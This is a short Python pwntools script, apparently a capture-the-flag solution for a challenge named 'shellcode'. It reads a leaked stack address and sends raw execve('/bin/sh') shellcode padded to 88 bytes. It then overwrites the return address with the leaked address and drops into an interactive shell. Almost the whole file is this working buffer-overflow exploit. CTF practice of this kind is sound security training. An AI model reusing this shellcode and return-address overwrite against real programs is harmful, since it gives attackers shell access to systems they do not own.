import os, sys
from pwn import *

context(os = 'linux', arch = 'amd64')

if False:
    # $ socat tcp-listen:9999,reuseaddr,fork, EXEC:"./shellcode"
    
    adrs, port = '127.0.0.1', 9999
    #adrs, port = "nc.ctf.setodanote.net", 26503
    
    # サーバに接続
    proc = remote( adrs, port )

else:
    #proc = gdb.debug( './shellcode' )
    proc = process( './shellcode' )

while True:
    ret = proc.recvline()
    ret = ret.decode( 'utf-8' )
    if '[' in ret:
        break

adrs = ret[ ret.find('[')+1:ret.find(']') ]
logging.debug( f"adrs={adrs}" )

ret = proc.recv( timeout=1 )

adrs = int( adrs, base=16 )

buf = b'\x48\x31\xC0\xB0\x3B\xEB\x09\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05\xE8\xF2\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x00'
buf += b'A' * (88 - len(buf))
buf += p64( adrs )

proc.sendline( buf )

proc.interactive()

